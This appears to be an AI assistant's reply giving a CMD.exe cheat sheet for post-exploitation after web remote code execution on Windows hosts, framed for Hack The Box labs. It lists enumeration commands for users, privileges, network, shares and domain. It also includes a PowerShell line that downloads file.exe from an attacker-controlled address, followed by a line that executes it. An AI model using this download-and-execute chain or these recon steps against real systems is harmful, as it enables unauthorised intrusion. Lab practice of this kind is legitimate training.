Got it — here’s a **clean CMD.exe cheat sheet** tailored for what you’re doing (Windows web RCE / IIS / JSP / ASP.NET environments).

---

# 🪟 CMD.EXE Command Cheat Sheet (Windows RCE / HTB Use)

---

> [!info] 🧩 Basic Execution Format
>
> ```text id="c9k2qz"
> cmd.exe /c <command>
> ```
>
> **Example**
>
> ```text id="m1p8nv"
> cmd.exe /c whoami
> ```

---

# 👤 SYSTEM / USER ENUMERATION

> [!tip] 🔍 Identify Current User
>
> ```text id="u7z2aa"
> cmd.exe /c whoami
> ```

---

> [!info] 🧠 Privileges
>
> ```text id="p3l8kx"
> cmd.exe /c whoami /priv
> ```

---

> [!tip] 👥 List Users
>
> ```text id="q2n7sd"
> cmd.exe /c net user
> ```

---

> [!info] 👤 User Details
>
> ```text id="k8v1lm"
> cmd.exe /c net user <username>
> ```

---

# 💻 SYSTEM INFO

> [!tip] 🖥️ Host Information
>
> ```text id="h4x9pn"
> cmd.exe /c hostname
> ```

---

> [!info] 🧾 Full System Details
>
> ```text id="r6t3cw"
> cmd.exe /c systeminfo
> ```

---

> [!tip] 🌐 Network Config
>
> ```text id="n1b7qa"
> cmd.exe /c ipconfig /all
> ```

---

> [!info] 🔌 Network Connections
>
> ```text id="t9c5mk"
> cmd.exe /c netstat -ano
> ```

---

# 📁 FILE SYSTEM ENUMERATION

> [!tip] 📂 Current Directory
>
> ```text id="d3p8lz"
> cmd.exe /c cd
> ```

---

> [!info] 📁 List Files
>
> ```text id="f6k2qv"
> cmd.exe /c dir
> ```

---

> [!tip] 🔎 Search Files
>
> ```text id="s7n4wx"
> cmd.exe /c dir C:\ /s /b | findstr flag
> ```

---

> [!info] 📄 Read File
>
> ```text id="l2q9vd"
> cmd.exe /c type C:\path\file.txt
> ```

---

# 🔐 PRIVILEGE ESCALATION CHECKS

> [!tip] 🔥 Check Admin Groups
>
> ```text id="a8m3zk"
> cmd.exe /c net localgroup administrators
> ```

---

> [!info] 🧠 Services (often useful for privesc)
>
> ```text id="w5r1np"
> cmd.exe /c sc query
> ```

---

# 🌐 NETWORK / DOMAIN ENUM (AD ENVIRONMENTS)

> [!tip] 🌍 Domain Info
>
> ```text id="z4t8xy"
> cmd.exe /c net view
> ```

---

> [!info] 🔗 Shares
>
> ```text id="e6k9qp"
> cmd.exe /c net share
> ```

---

> [!tip] 👥 Domain Users (if domain joined)
>
> ```text id="v2n5sb"
> cmd.exe /c net user /domain
> ```

---

# ⚡ QUICK RCE TEST COMMANDS

> [!tip] 🧪 Confirm Execution
>
> ```text id="c1p7tt"
> cmd.exe /c echo HACKED
> ```

---

> [!info] ⏱️ Time Check (useful sanity test)
>
> ```text id="y8m3rd"
> cmd.exe /c time /t
> ```

---

# 🚀 FILE TRANSFER (VERY USEFUL)

> [!tip] 📥 Download via PowerShell
>
> ```text id="x9q2lv"
> cmd.exe /c powershell -c "Invoke-WebRequest http://10.10.14.116/file.exe -OutFile file.exe"
> ```

---

> [!info] ▶ Execute Payload
>
> ```text id="p6w1kc"
> cmd.exe /c file.exe
> ```

---

# 🧠 Mental Model

```text id="g7n2pa"
Web RCE → cmd.exe /c → Windows OS → system commands → escalation
```

---

# ⚠️ Key Rule

Always remember:

| Goal           | Use                             |
| -------------- | ------------------------------- |
| Simple command | `cmd.exe /c whoami`             |
| Complex logic  | `powershell -c ...`             |
| File ops       | `dir`, `type`, `copy`           |
| Recon          | `systeminfo`, `net`, `ipconfig` |

---

